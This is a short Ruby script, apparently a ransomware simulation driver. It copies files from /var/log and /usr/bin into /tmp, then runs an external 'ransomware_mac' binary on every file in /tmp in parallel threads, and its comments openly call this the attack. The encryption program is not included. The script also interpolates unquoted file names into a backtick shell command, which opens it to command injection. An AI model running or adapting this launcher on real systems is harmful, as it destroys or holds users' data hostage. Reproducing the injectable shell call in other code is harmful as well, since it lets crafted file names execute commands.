#!/usr/bin/ruby

require "fileutils"
require "thread"

def cur_time()
  return Time.now.strftime("%d/%m/%Y %H:%M:%S")
end

#This method is used to copy all files the folder /usr/bin to the /tmp dictionary
#symbolic links and folders will be skipped.
def copy_files2tmp()
  Dir.glob(['/var/log/*','/usr/bin/*']) do |filename|
    src_path_file = filename
    dest_path_file = '/tmp/' + File.basename(src_path_file)
    if not ( File.symlink?(src_path_file) or  File.directory?(src_path_file))
      if not File.exist?(dest_path_file)
        begin
          FileUtils.cp(src_path_file, dest_path_file)
          msg = "[#{cur_time}] Completed copying  %-50s" % [filename]
          puts msg.strip
        rescue
          next
        end
      else
        msg = "[#{cur_time}] %-50s exists, skipped!" % [filename]
        puts msg.strip
      end
    end
  end
end

# This method is used to invoke ransomware_mac to encrypt file
def start_attack()
	puts "\n\n!!Finished copying files, the ransomware starts encrypting files by using multiple threads.!!\n\n"
	threads = []
	Dir.glob('/tmp/*') do |full_file_path|
		# build thread to run the encryption program
		threads << Thread.new { 
			`./ransomware_mac #{full_file_path}`
			sleep(rand(1..5))
			puts "[#{cur_time}] Finished encrypting file #{full_file_path}"
		}
		
		if threads.size > 4 then # 4 threads work simultaneously.
			threads.each(&:join) # wait all the thread to finish the tasks
			threads.clear()
		end
	end
end

# The first step is to copy files from /usr/bin and /var/log into 
# /tmp/ folder
copy_files2tmp()

# then start to attack 
start_attack()

